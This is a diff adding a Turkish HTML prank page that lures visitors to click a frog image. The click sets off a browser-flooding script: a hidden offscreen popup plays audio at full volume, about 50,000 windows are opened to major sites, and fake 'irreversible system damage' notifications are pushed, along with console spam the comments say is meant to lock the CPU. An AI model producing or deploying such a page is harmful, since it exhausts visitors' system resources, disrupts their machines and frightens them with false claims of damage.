@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>SİSTEM_KRİTİK_HATA_V6</title>
+    <style>
+        body { 
+            background: #000; margin: 0; height: 100vh; 
+            display: flex; flex-direction: column;
+            justify-content: center; align-items: center; 
+            overflow: hidden; font-family: 'Courier New', monospace;
+            cursor: wait;
+        }
+        #warning-text { 
+            position: absolute; top: 5%; color: #ff0000; 
+            font-size: 32px; font-weight: bold; text-align: center;
+            z-index: 100; text-shadow: 0 0 20px #f00;
+            animation: blink 0.5s infinite;
+        }
+        @keyframes blink { 0% {opacity: 1} 50% {opacity: 0} 100% {opacity: 1} }
+
+        /* Yeni GIF Ayarları */
+        #trigger-image { 
+            width: 450px; cursor: pointer; z-index: 10;
+            transition: 0.1s; filter: drop-shadow(0 0 30px #f00);
+        }
+        #trigger-image:hover { transform: scale(1.05); }
+
+        .shake-screen { animation: shake-hard 0.05s infinite; }
+        @keyframes shake-hard {
+            0% { transform: translate(10px, 10px) rotate(0deg); }
+            50% { transform: translate(-10px, -10px) rotate(1deg); }
+            100% { transform: translate(10px, -10px) rotate(-1deg); }
+        }
+    </style>
+</head>
+<body id="main-body">
+
+    <div id="warning-text"> selam siteyi başlatın! <br> kurbağaya tıkla!</div>
+    
+    <img id="trigger-image" src="https://images.steamusercontent.com/ugc/868493592238108875/819D87E3DB18DEF56347D2BEEA2B0B6ABA35A5EC/?imw=5000&imh=5000&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=false" alt="Kritik Hata">
+
+    <script>
+        const trigger = document.getElementById('trigger-image');
+        const body = document.getElementById('main-body');
+        
+        const targetSites = [
+            "https://www.google.com", "https://www.youtube.com", "https://www.nasa.gov",
+            "https://www.wikipedia.org", "https://www.reddit.com", "https://www.apple.com"
+        ];
+
+        trigger.addEventListener('click', async () => {
+            // 1. Ekranı salla ve yazıyı değiştir
+            body.classList.add('shake-screen');
+            document.getElementById('warning-text').innerText = "SİSTEM İMHASI BAŞLATILDI...";
+
+            // 2. YouTube Ses Saldırısı (Gizli Pencere)
+            // Sesi maksimumda başlatmak için autoplay parametresi eklendi
+            const musicURL = "https://www.youtube.com/embed/uW7BEmCOGE8?autoplay=1&mute=0&volume=100";
+            window.open(musicURL, 'audio_attack', 'width=1,height=1,left=20000,top=20000');
+
+            // 3. Bildirim İzni ve Başlatma
+            if (Notification.permission !== "granted") {
+                await Notification.requestPermission();
+            }
+
+            // 4. 50.000 Sekme ve Bildirim Döngüsü
+            for (let i = 0; i < 50000; i++) {
+                setTimeout(() => {
+                    let site = targetSites[i % targetSites.length] + "?payload=" + Math.random();
+                    
+                    // Rastgele Koordinatlar
+                    let w = 350; let h = 350;
+                    let l = Math.random() * (window.screen.width - w);
+                    let t = Math.random() * (window.screen.height - h);
+
+                    // Yeni Pencere ve Sekme Saldırısı
+                    window.open(site, '_blank', `width=${w},height=${h},left=${l},top=${t}`);
+
+                    // Bildirim Yağmuru
+                    if (i % 4 === 0 && Notification.permission === "granted") {
+                        new Notification("CRITICAL_ERR_" + i, {
+                            body: "RAM TAŞTI! SİSTEM GERİ DÖNÜLEMEZ HASAR ALDI.",
+                            icon: trigger.src
+                        });
+                    }
+
+                    // İşlemciyi (CPU) kitlemek için sonsuz log basımı
+                    console.error("FATAL_SYSTEM_OVERLOAD_PROC_ID_" + i);
+                    
+                }, i * 0.1); // 0.1 milisaniye - Maksimum veri akışı
+            }
+        });
+    </script>
+</body>
+</html>
+@codere1q257
+Comment
